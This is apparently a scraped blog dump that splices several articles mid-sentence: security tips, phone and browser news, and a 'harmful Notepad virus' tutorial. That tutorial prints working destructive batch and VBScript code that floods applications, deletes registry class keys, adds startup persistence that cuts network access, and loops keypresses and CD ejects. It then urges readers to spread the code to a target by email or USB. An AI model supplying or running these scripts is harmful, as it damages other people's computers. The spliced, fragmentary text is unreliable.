plugin v14.4.1 - https:\/\/yoast.com\/wordpress\/plugins\/seo\/ -->\n<meta name=\"description\" content=\"Security reacher has found a bug in Firefox that can crash browser. Or secure server? Well, everything is illusion. You can say &#8220;Security Is Just An Illusion&#8221;.<\/p>\n<p>Let&#8217;s take a scenario. There is a king who has been getting threats of getting assassinated. Now it&#8217;s time for the king to increase the security for himself, his palace and his treasury.<\/p>\n<p>What will he do? He will order his commander to order his guard to guard him 24\/7. In and out, everywhere! What do you think about the situation of the king? He must be scared! Hey! The king is brave, isn&#8217;t he? Let&#8217;s not talk about bravery. No matter how brave you are, you will fear your death. Hey there! Let&#8217;s not talk about death. So.. Have you understood the situation? If not, let me explain.<\/p>\n<p>The king is the server, the palace is the network and commander is the firewall. All these three combination makes a website. Don&#8217;t forget that treasury stands for the confidential database the server has stored within it&#8217;s network.<\/p>\n<p><img data-attachment-id=\"450\" Expert If You Want To Save Your Time &amp; Money<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-10\" Share it with your loved ones.\">Thank You, Share it with your loved ones.<\/a><\/li><\/ul><\/li><\/ul><\/nav><\/div>\n<h1><span class=\"ez-toc-section\" id=\"How_To_Secure_Website\"><\/span>How To Secure Website?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>Let&#8217;s not play king and enemy. Let&#8217;s move on to our main topic and concept.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"The_Code\"><\/span>The Code<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>To make the outer shell of your network stronger, you must make your core stronger. But what is the core? The kernel of your OS? Or what? Well, No.<\/p>\n<p><img data-attachment-id=\"451\" data-permalink=\"https:\/\/theshadowpress.com\/secure-website-simple-steps\/code-1839406_1920\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920.jpg\" data-orig-size=\"1920,1281\" data-comments-opened=\"1\" data-image-meta=\"{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;NIKON D800&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;105&quot;,&quot;iso&quot;:&quot;640&quot;,&quot;shutter_speed&quot;:&quot;0.02&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}\" data-image-title=\"code-1839406_1920\" data-image-description=\"\" data-medium-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-300x200.jpg\" data-large-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-1024x683.jpg\" class=\" wp-image-451 aligncenter\" src=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-300x200.jpg\" alt=\"The Code\" width=\"600\" height=\"400\" srcset=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-300x200.jpg 300w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-768x512.jpg 768w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-1024x683.jpg 1024w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-696x464.jpg 696w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-1068x713.jpg 1068w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-630x420.jpg 630w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920.jpg 1920w\" sizes=\"(max-width: 600px) 100vw, 600px\" \/><\/p>\n<p>The core of your system is your codings. If your coding have vulnerabilities within it, you&#8217;re gone. The main work of an hacker to breach into the server is to check for core vulnerability. Before hiring a web developer or a programmer for your project, make sure you write up and let him sign the agreement for the responsibility of your network. You can add <a href=\"https:\/\/sucuri.net\" target=\"_blank\" rel=\"noopener\">Sucuri WAF<\/a>(Web App Firewall) to make sure if there is any vulnerability in your website, hacker cannot exploit it. They&#8217;re good enough, so I&#8217;d recommend you.<\/p>\n<p>A few weeks back, Kodi, an online movie streaming application&#8217;s addon was found to be compromised by an attacker. The attacker edited the code by adding malicious cryptomining malware codes through which he mined cryptocurrency. <a href=\"https:\/\/theshadowpress.com\/cryptovirus-hits-windows-and-linux-kodi-users\/\" target=\"_blank\" rel=\"noopener\">Read more<\/a>.<\/p>\n<p>If you are a programmer then you should check your code very deeply. This deep double<\/p>\n<h2><span class=\"ez-toc-section\" id=\"Your_Wall_Judges_The_Value_Of_Your_Treasury_%E2%80%93_Firewall\"><\/span>Your Wall Judges The Value Of Your Treasury &#8211; Firewall<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>It doesn&#8217;t matter how good your palace looks like from outside. If you ask me, I would just paint a thermacol and use it as a wall. But does that satisfy you? No. It&#8217;s weak. Make sure you have a firewall that has everything you need. Let&#8217;s see what our beloved Wikipedia has got to say about Firewall.<\/p>\n<blockquote><p>In computing, a firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. A firewall typically establishes a barrier between a trusted internal network and untrusted external network, such as the Internet.<\/p><\/blockquote>\n<p>If you&#8217;re at corporate level and have 5000$+ budget to spend on security, I would recommend you to buy <a href=\"https:\/\/www.cloudflare.com\/\">Cloudflare&#8217;s<\/a> Enterprise plan. It includes top level WAF and a lot of other highly optimized security features compared to the &#8220;FREE&#8221; plan.<\/p>\n<p><img data-attachment-id=\"454\" security. If you do even a small mistake, or compromise for your website&#8217;s security, it may lead to a critical threat for your company in future.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"The_Stronger_You_Become_The_More_You_Be_Able_To_Reach_Your_Height\"><\/span>The Stronger You Become The More You Be Able To Reach Your Height<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>It doesn&#8217;t matter if you are running a small blog or a corporate level business, you must have a strong base. If you are running low on resources then you might often face &#8220;ERROR ESTABLISHING DATABASE CONNECTION&#8221;. 80% of time when this error is occured, it is because of <a href=\"https:\/\/theshadowpress.com\/an-introduction-to-dos-denial-of-service\/\">DoS\/DDoS<\/a> attack being carried out against your server\/website.<\/p>\n<p><img data-attachment-id=\"69\" data-permalink=\"https:\/\/theshadowpress.com\/difference-between-dos-and-ddos\/ddos\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos.jpg\" data-orig-size=\"640,425\" data-comments-opened=\"1\" data-image-meta=\"{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}\" data-image-title=\"ddos\" data-image-description=\"\" data-medium-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos-300x199.jpg\" data-large-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos.jpg\" class=\"wp-image-69 aligncenter\" src=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos-300x199.jpg\" alt=\"\" width=\"571\" height=\"379\" srcset=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos-300x199.jpg 300w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos-632x420.jpg 632w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2017\/09\/ddos.jpg 640w\" sizes=\"(max-width: 571px) 100vw, 571px\" \/><\/p>\n<p>If you are getting attacked, it isn&#8217;t your fault. The first priority of a hacker is to compromise your email. He writes your name and 1-5 numerical as an attempt of authentication. For example, your name is John. He will try password as &#8220;John12345&#8221; or &#8220;john123&#8221; or &#8220;john12031996&#8243; where &#8221;<\/p>\n<p><a href=\"https:\/\/theshadowpress.com\/choosing-strong-password\/\"><img But what does Phish mean? Yes, you thought right. Phish means phishing. &#8220;Phishing&#8221; is a technique in which a hacker manipulates a login portal and makes a fake out of it. It mainly consists of a social media website or a net banking website.<\/p>\n<p><img data-attachment-id=\"458\" Because whenever a hacker targets you, his first attempt to hack you is to manipulate you by contacting you. Better you don&#8217;t accept such kind of fake profiles.<\/p>\n<p>Also Read &#8211; <a href=\"https:\/\/theshadowpress.com\/types-of-malwares-and-how-do-they-work\/\">Types Of Malware &amp; How Do They Work?<\/a><\/p>\n<h2><span class=\"ez-toc-section\" id=\"2FA_Is_The_%E2%80%9CMUST%E2%80%9D!\"><\/span>2FA Is The &#8220;MUST&#8221;!<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>2FA? What does it mean? The term &#8220;2FA&#8221; stands for two-factor authentication. In case if a hacker is able to compromise your database and get password to administrator panel, he\/she won&#8217;t be able to log into your admin portal. It is because when the hacker tries to login into your portal, an email or SMS will be sent to you to verify the identity of the one who is logging in.<\/p>\n<p><img data-attachment-id=\"459\" implement it on your website to make sure that a hacker cannot access your client&#8217;s account or your account. We&#8217;ll go step by step in details.<\/p>\n<p>We all know virus is a malicious program that infects the victim&#8217;s machine, making it laggy or crash. In further circumstances, a virus can be used to spy on victim&#8217;s computer to log his\/her activities.<\/p>\n<div id=\"ez-toc-container\" class=\"ez-toc-v2_0_11 counter-hierarchy counter-decimal ez-toc-grey\">\n<div class=\"ez-toc-title-container\">\n<p class=\"ez-toc-title\">Jump To<\/p>\n<span class=\"ez-toc-title-toggle\"><a class=\"ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle\"><i class=\"ez-toc-glyphicon ez-toc-icon-toggle\"><\/i><\/a><\/span><\/div>\n<nav><ul class=\"ez-toc-list ez-toc-list-level-1\"><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-1\" href=\"https:\/\/theshadowpress.com\/create-harmful-notepad-virus\/#How_To_Create_Harmful_Notepad_Virus_%5BIntro%5D\" title=\"How To Create Harmful Notepad Virus [Intro]\">How To Create Harmful Notepad Virus [Intro]<\/a><ul class=\"ez-toc-list-level-2\"><li class=\"ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-2\" href=\"https:\/\/theshadowpress.com\/create-harmful-notepad-virus\/#1_Application_Bomber\" title=\"1. Such virus leads to slow processing of data and etc. This often crashes the victim&#8217;s computer.<\/p>\n<p><img data-attachment-id=\"438\" data-permalink=\"https:\/\/theshadowpress.com\/create-harmful-notepad-virus\/intross\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/intross.png\" data-image-title=\"intross\" data-image-description=\"&lt;p&gt;PS: This is not a virus code&lt;\/p&gt;\n\" virus. You can see the codes below and according to that, you can copy and paste the codes into your notepad.<\/p>\n<p>When you paste the code in notepad, click on File &gt; Save As &gt; Select folder where you want to save &gt; filename.bat. Make sure you paste it as a bat so that the file is executable.<\/p>\n<p><strong>Note<\/strong> :- Before we begin, please note that this tutorial is just for testing purpose. Readers are adviced to not use it for illegal purpose. Please do not execute these virus on your own PC as it may harm. My personal suggestion is that you make these virus in a virtual environment so that it doesn&#8217;t harm your main machine.<\/p>\n<p>Also Read &#8211; <a href=\"https:\/\/theshadowpress.com\/top-4-antivirus\/\">Top 4 Antivirus To Kill Malware &amp; Trojans From Your PC And Boost It&#8217;s Performance<\/a>.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"1_Application_Bomber\"><\/span>1. Application Bomber<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>This virus code will bomb your current session with specified windows in-built applications until it crashes. These applications will eventually eat your computer&#8217;s ram &#8211; making it crash. Please do not try this at your own machine as this may cause unnecessary heat of core and RAM.<\/p>\n<pre>@echo off\r\n :x\r\n start winword\r\n start mspaint\r\n start notepad\r\n start write\r\n start cmd\r\n start explorer\r\n start control\r\n start calc\r\n goto x<\/pre>\n<h2><span class=\"ez-toc-section\" id=\"2_Endless_Enter\"><\/span>2. Endless Enter<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>This code will make it endless enter press on your computer.<\/p>\n<pre>Set wshShell = wscript.CreateObject(\u201dWScript.Shell\u201d)\r\n do\r\n wscript.sleep 100\r\n wshshell.sendkeys \u201c~(enter)\u201d\r\n loop<\/pre>\n<h3><span class=\"ez-toc-section\" id=\"3_Disable_Internet_Permanently\"><\/span><span id=\"1_Disable_Internet_Permanently\" class=\"ez-toc-section\">3.\u00a0Disable Internet Permanently<\/span><span class=\"ez-toc-section-end\"><\/span><\/h3>\n<p>This code will disable the internet connectivity permanently.<\/p>\n<pre>echo @echo off&gt;c:windowswimn32.bat\r\necho break off&gt;c:windowswimn32.bat echo\r\nipconfig\/release_all&gt;c:windowswimn32.bat\r\necho end&gt;c:windowswimn32.batreg add\r\nhkey_local_machinesoftwaremicrosoftwindowscurrentversionrun \/v WINDOWsAPI \/t reg_sz \/d c:windowswimn32.bat \/freg add\r\nhkey_current_usersoftwaremicrosoftwindowscurrentversionrun \/v CONTROLexit \/t reg_sz \/d c:windowswimn32.bat \/fecho You Have Been HACKED!\r\nPAUSE\r\n\r\n<\/pre>\n<h3><span class=\"ez-toc-section\" id=\"4_Delete_Key_Registry_Files\"><\/span><span id=\"2_Delete_Key_Registry_Files\" class=\"ez-toc-section\">4.\u00a0Delete Key Registry Files<\/span><span class=\"ez-toc-section-end\"><\/span><\/h3>\n<p>This will delete key registry files, then loops a message<\/p>\n<p>This is dangerous\u00a0and unrecoverable Notepad Virus.<\/p>\n<pre>@ECHO OFF\r\n START reg delete HKCR\/.exe\r\n START reg delete HKCR\/.dll\r\n START reg delete HKCR\/*\r\n :MESSAGE\r\n ECHO Your PC\u00a0has been crashed.Your Dad.\r\n GOTO MESSAGE<\/pre>\n<h3><\/h3>\n<h3><span class=\"ez-toc-section\" id=\"5_Endless_Notepads\"><\/span><span id=\"3_Endless_Notepads\" class=\"ez-toc-section\">5.\u00a0Endless Notepads<\/span><span class=\"ez-toc-section-end\"><\/span><\/h3>\n<p>This will pop up endless notepads until the computer freezes and crashes<\/p>\n<pre>@ECHO off\r\n :top\r\n START %SystemRoot%\\system32\\notepad.exe\r\n GOTO top<\/pre>\n<h3><\/h3>\n<h3><span class=\"ez-toc-section\" id=\"6_Popping_CD_Drives\"><\/span><span id=\"4_Popping_CD_Drives\" class=\"ez-toc-section\">6.\u00a0Popping CD Drives<\/span><span class=\"ez-toc-section-end\"><\/span><\/h3>\n<p>This will make the CD drives constantly pop out<\/p>\n<pre>Set oWMP = CreateObject(\u201dWMPlayer.OCX.7\u2033)\r\n Set colCDROMs = oWMP.cdromCollection\r\n do\r\n if colCDROMs.Count &gt;= 1 then\r\n For i = 0 to colCDROMs.Count \u2013 1\r\n colCDROMs.Item(i).Eject\r\n Next\r\n For i = 0 to colCDROMs.Count \u2013 1\r\n colCDROMs.Item(i).Eject\r\n Next\r\n End If\r\n wscript.sleep 100\r\n loop<\/pre>\n<h1><span class=\"ez-toc-section\" id=\"Saving_The_Virus_Code\"><\/span>Saving The Virus Code<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>After you paste the code according to your need, you need to save it as batch file. Let&#8217;s do it.<\/p>\n<p><img data-attachment-id=\"447\" data-permalink=\"https:\/\/theshadowpress.com\/create-harmful-notepad-virus\/saving\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving.png\" data-orig-size=\"1422,748\" data-comments-opened=\"1\" data-image-meta=\"{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}\" data-image-title=\"saving\" data-image-description=\"\" data-medium-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-300x158.png\" data-large-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-1024x539.png\" class=\" wp-image-447 aligncenter\" src=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-300x158.png\" alt=\"Saving The Code\" width=\"630\" height=\"332\" srcset=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-300x158.png 300w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-768x404.png 768w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-1024x539.png 1024w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-696x366.png 696w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-1068x562.png 1068w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving-798x420.png 798w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/saving.png 1422w\" sizes=\"(max-width: 630px) 100vw, 630px\" \/><\/p>\n<p>Yes, you did it! You have successfully created a notepad virus. Now it&#8217;s time to spread it to your target&#8217;s computer. You can do that by the mean of email, USB and etc.<\/p>\n<hr \/>\n<p>Note again :- This article is just for educational purpose. Any illegal use is strictly forbidden. Readers are adviced to not to use it to harm someone&#8217;s computer without any reason. Any harm being caused to your computer is at your own consent. Launches Monzilla Reality Browser For VR Headsets"},"content":{"rendered":"<h1>Monzilla Launches Monzilla Reality Browser<\/h1>\n<p>Monzila launches <a href=\"https:\/\/mixedreality.mozilla.org\/firefox-reality\/\" target=\"_blank\" rel=\"noopener\">Monzilla Reality<\/a> browser. A web browser application company has taken browsing to next level by adding VR support. It is exclusively built to support with VR Standalone and AR headsets.<\/p>\n<p>You can really utilize Firefox Reality inside a virtual reality headset to search and browse sites just with your VR hand controller. This internet browser makes use of voice recognition for seeking while you venture into an immersive PC created world.<\/p>\n<h1>How Does It Looks Like?<\/h1>\n<p>Just for backup, there is a handheld pointer for typing words character by character from a virtual keyboard, however clearly its an excruciatingly slow technique and no one will use it.<\/p>\n<p><img data-attachment-id=\"429\" One of a <a href=\"https:\/\/www.reddit.com\/r\/Xiaomi\/comments\/9g9hlj\/redmi_note_6_pro_leaked\/\">Reddit user<\/a> posted some pics of upcoming Xiaomi Redmi Note 6 Pro phone. This maybe considered as a rumor as there hasn&#8217;t been any official announcement by Xiaomi yet.<\/p>\n<h1>Xiaomi Redmi Note 6 Pro<\/h1>\n<p>The leaked images of Redmi Note 6 Pro phone reveals a glimpse of display and some specifications of the phone. Another image by GlobeMobile gives a glance of the retail box of the phone. The retail box gives the hint of the specification of the phone as 4 GB RAM &amp; 64 GB Internal Space.<\/p>\n<h1>Redmi Note 6 Pro Pics<\/h1>\n<p>The smartphone\u2019s leaked image and its retail box suggests that the\u00a0<span class=\"articleTooltip withIcon\">Redmi Note 6 Pro<\/span>\u00a0could feature a 6.26-inch display with a 19:9 aspect ratio and Full HD+ resolution. It is touted to come equipped with four cameras. On the front, it could sport a 20MP + 2MP camera setup that is capable of capturing bokeh shots, while on the back it is said to feature dual 12MP + 5MP sensors. The main camera is tipped to support dual-pixel autofocus and come with a 1.4\u00b5m pixel size. Finally, it is said to be backed by a 4000mAh battery and come with 4GB RAM, coupled with 64GB of internal storage.<\/p>\n<p>The picture posted by Slashleak likewise reiterates\u00a0all of the above determinations and furthermore adds to them. According to the affirmed restricted specs outline, the\u00a0Redmi Note 6 Pro\u00a0will be controlled by the Snapdragon 636 SoC and come in another variation with 3GB RAM and 32GB of inward stockpiling. Be that as it may, it is said to include a smaller scale USB port for charging the vast battery, which will be a let down in the event that it ends up being valid. Be that as it may, as the pictures are for the most part spills, we recommend that you take this with a touch of salt.<\/p>\n<p><img src=\"https:\/\/static.digit.in\/default\/c14da6c5714d79fc7433052b6a9e803f178f2b4d.jpeg\" alt=\"\" \/><\/p>\n<p>The Redmi Note 6 expert has been outed in a picture where a portion of its particulars can be seen, alongside its outline. Another picture uncovers the container particulars of the gadget. while a third picture is said to be of the gadget&#8217;s specs under ban.<\/p>\n<h4>Rumored Pricings<\/h4>\n<p>91Mobile&#8217;s website shows the rumored price as 14,999 rupees. However Xiaomi hasn&#8217;t made any confirmation yet regarding the release.<\/p>\n<hr \/>\n<p>Thank you for reading out article. If you like this article, please share. For those who are not aware of price, Samsung cost approximately 1000$. They have a powerful battery backup of 4000 mAh.<\/p>\n<h1>Galaxy Note 9 Catches Fire Inside\u00a0Diane Chung&#8217;s purse. (Real Estate Agent)<\/h1>\n<p>The real estate agency women files lawsuit against Samsung after it becomes extremely hot when she was in elevator. [According to <a href=\"https:\/\/nypost.com\/2018\/09\/15\/woman-says-galaxy-note-9-burst-into-flames-inside-her-purse\/\">New York Time Post Report<\/a>].<\/p>\n<p>The women stated in the report that her phone started to become very &#8220;hot&#8221; and she stopped using her phone. She opened her purse and stored the &#8220;hot&#8221; phone inside it. After a short span of seconds, she noticed smoke coming out of her purse. She then threw her bag on the floor of the elevator and tried to take out the phone, burning her fingers.<\/p>\n<p>After the elevator reached it&#8217;s destination floor, she kicked the phone out of the elevator.\u00a0A Samaritan noticed the burning phone on the floor outside the elevator and he extinguished the fire with water and fire extinguisher.<\/p>\n<p>After all, this was the first report of phone catching fire of Galaxy Note 9. For those who don&#8217;t remember, there was tons of cases when Galaxy Note 7 catched fire in 2016. At that time, Samsung recalled millions of devices and had to refund the amount which caused them a huge financial loss and lawsuits.<\/p>\n<p>According to the women, the event left her traumatized and unable to contact her clients, and the filed legal claim seeks reparation for damages.<\/p>\n<hr \/>\n<h2>Quick Summary<\/h2>\n<p>A women from America named Diane Chung who is a real estate agent files lawsuit against Samsung after her Galaxy Note 9 catches fire inside her purse. After this incident, she approached Queens Supreme Court and files lawsuit and seeks repair of damage\u00a0occurred to her.<\/p>\n<p>Also Read &#8211; <a href=\"https:\/\/theshadowpress.com\/protect-business-from-security-breach\/\">How To Protect Business From Security Breach[Step By Step Guide]<\/a><\/p>\n","protected":false},"excerpt":{"rendered":"<p>A women from USA filed lawsuit against Samsung after Galaxy Note 9 catches fire inside her purse. If you think, you can become rich by just launching a business and get sales, you are wrong. It is a good practice to run business online as it boost your sales and brand awareness by 10x times. In this article, we&#8217;re gonna learn to protect business from security breach. So let&#8217;s begin with our ethics &amp; steps.<\/p>\n<div id=\"ez-toc-container\" class=\"ez-toc-v2_0_11 counter-hierarchy counter-decimal ez-toc-grey\">\n<div class=\"ez-toc-title-container\">\n<p class=\"ez-toc-title\">Jump To<\/p>\n<span class=\"ez-toc-title-toggle\"><a class=\"ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle\"><i class=\"ez-toc-glyphicon ez-toc-icon-toggle\"><\/i><\/a><\/span><\/div>\n<nav><ul class=\"ez-toc-list ez-toc-list-level-1\"><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-1\" href=\"https:\/\/theshadowpress.com\/protect-business-from-security-breach\/#Protect_Business_From_Security_Breach\" title=\"Protect Business From Security Breach\">Protect Business From Security Breach<\/a><ul class=\"ez-toc-list-level-2\"><li class=\"ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-2\" href=\"https:\/\/theshadowpress.com\/protect-business-from-security-breach\/#1_Never_Respond_To_Malicious_Emails_or_Engage_With_It\" title=\"1. Hire A Well Known Security Firm To Ensure The Digital Dignity Of Your Business\">5. Hire A Well Known Security Firm To Ensure The Digital Dignity Of Your Business<\/a><\/li><\/ul><\/li><\/ul><\/nav><\/div>\n<h1><span class=\"ez-toc-section\" id=\"Protect_Business_From_Security_Breach\"><\/span>Protect Business From Security Breach<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>Let&#8217;s do it step by step so it would be easier for us to remember every points.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"1_Never_Respond_To_Malicious_Emails_or_Engage_With_It\"><\/span>1. Never Respond To Malicious Emails or Engage With It<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>Business owners often gets spam emails. Google usually puts such emails in it&#8217;s spam category and puts it as &#8220;red&#8221; mark on the email. If you are an old-school businessmen\/women, you should once had encountered to such an email. These emails usually contains about you winning 5 million or 10 million dollars or more or less. These emails are so well organized that you won&#8217;t find it to be &#8220;scam&#8221; or &#8220;spam&#8221;. But never respond to such emails or you would encounter with many more spam and scam emails and advertisements that you would have to delete them a-lot daily. If you respond or click to any malicious link then there is 80% chance that your computer would&#8217;ve been infected by some kind of trojan or malware through which hacker is keeping an eye on you and your business confidential activities. This is a potential and a common threat that everyone should be aware of.<\/p>\n<p><img data-attachment-id=\"395\" data-permalink=\"https:\/\/theshadowpress.com\/protect-business-from-security-breach\/scam\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/Scam.png\" 554px\" \/><\/p>\n<h2><span class=\"ez-toc-section\" id=\"2_Keep_Your_Operating_System_Antivirus_Updated\"><\/span>2. Keep Your Operating System &amp; Antivirus Updated<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>Operating system and antivirus companies usually put up updates against intrusion of hackers and malicious vulnerabilities in your computer system. Make sure you always update them so whenever a potential threat comes up, your system has the ability to stop it. This not only goes for your personal computer, but it implies for your server too(if you run one). Because when a hacker targets a company\/organization, he\/she targets their digital system for the first. The first priority would be their website\/server because that&#8217;s where database is stored. If he\/she fails in breaching your server(because you had your server protected), he\/she will try to access your PC later then.<\/p>\n<p>Also Read &#8211; <a href=\"https:\/\/theshadowpress.com\/top-4-antivirus\/\">Top 4 Antivirus To Kill Threats &amp; Boost Your PC<\/a>.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"3_Download_Only_What_You_Need\"><\/span>3. Download Only What You Need<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>Download only what you need as you may see about the recent <a href=\"https:\/\/theshadowpress.com\/cryptovirus-hits-windows-and-linux-kodi-users\/\">Kodi cryptomalware infection<\/a> that was used to mine cryptocurrency from user&#8217;s PC. So it&#8217;s is quite clear to download only what is required in your PC. Always make sure you download what you need nevertheless it is secured or not because you don&#8217;t know what may cause when. For example, if you want to download a browser, download only one not two.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"4_Never_Plugin_Unknown_Devices_Into_Your_PC\"><\/span>4. Never Plug-in Unknown Devices Into Your PC.<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>Found out a Pen-drive on a roadside? Curious to see what&#8217;s inside it? Do not plug it in! 95% of road-side found pendrives contains trojan and they&#8217;re thrown deliberately to let someone find it out and plug it in their PC. Such pendrives contains malware &amp; trojans which are set to run on autorun that means when you plug them in they&#8217;ll autorun the virus and all your information may get uploaded to hacker&#8217;s server. This will help you to protect business from security breach.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"5_Hire_A_Well_Known_Security_Firm_To_Ensure_The_Digital_Dignity_Of_Your_Business\"><\/span>5. Hire A Well Known Security Firm To Ensure The Digital Dignity Of Your Business<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>If you are not a tech-savy then you should probably hire a team to protect your business if you are financially stable and ready for this. They will help you with proper consultation and will guide you to what to do and what to not to do. You can hire a security team for your business who ensures the cyber intelligence and dignity of your business. If you want a perfect, affordable and trust-worthy cyber intelligence team then you should know that The Shadow Press&#8217;s association partner also holds one. All You Need To Know"},"content":{"rendered":"<p>Starting from 30th March 2018, Google URL Shortener closing down soon. In it&#8217;s dashboard, Goo.gl has announced about it&#8217;s closure in the month of March, 2018. Google URL Shortener closing soon.<\/p>\n<p>From April 2018, the URL shortening service is no more accepting new users. Only existing users are allowed to create short URLs on goo.gl console.<\/p>\n<h1>Google URL Shortener Closing Soon<\/h1>\n<p>Google launched the URL shortener in year 2009 as a way to help peoples compress a &#8220;long URL&#8221; into a small one and to measure the traffic.\u00a0Since then, many popular URL shortening services have emerged and the ways people find content on the Internet have also changed dramatically, from primarily desktop webpages to apps, mobile devices, home assistants, and more.<\/p>\n<p>Beginning April 13, 2018, anonymous clients and clients who have never made short connections today won&#8217;t have the capacity to make new short connections by means of the goo.gl support. In the event that you are hoping to make new short connections, we prescribe you look at well known administrations like <a href=\"https:\/\/bitly.com\">Bitly<\/a> and <a href=\"https:\/\/hootsuite.com\/pages\/owly\">Ow.ly<\/a> as an option.<\/p>\n<p>You can check the message on Goo.gl. We&#8217;ll show you here.<\/p>\n<blockquote><p>Starting\u00a0March 30, 2018, we will be turning down support for goo.gl URL shortener. From\u00a0April 13, 2018\u00a0only existing users will be able to create short links on the goo.gl console. You will be able to view your analytics data and download your short link information in csv format for up to one year, until\u00a0March 30, 2019, when we will discontinue goo.gl. Previously created links will continue to redirect to their intended destination. Please see this\u00a0<a href=\"https:\/\/developers.googleblog.com\/2018\/03\/transitioning-google-url-shortener.html\">blog post<i class=\"material-icons\">open_in_new<\/i><\/a>\u00a0for more details.<\/p><\/blockquote>\n<h1>For Developers<\/h1>\n<p>For developers, Google has added the following paragraph in their <a href=\"https:\/\/developers.googleblog.com\/2018\/03\/transitioning-google-url-shortener.html\">blog post<\/a>.<\/p>\n<p><em>Starting May 30, 2018, only projects that have accessed\u00a0<a href=\"https:\/\/developers.google.com\/url-shortener\/v1\/getting_started\">URL Shortener APIs<\/a>\u00a0before today can create short links. To create new short links, we recommend\u00a0<a 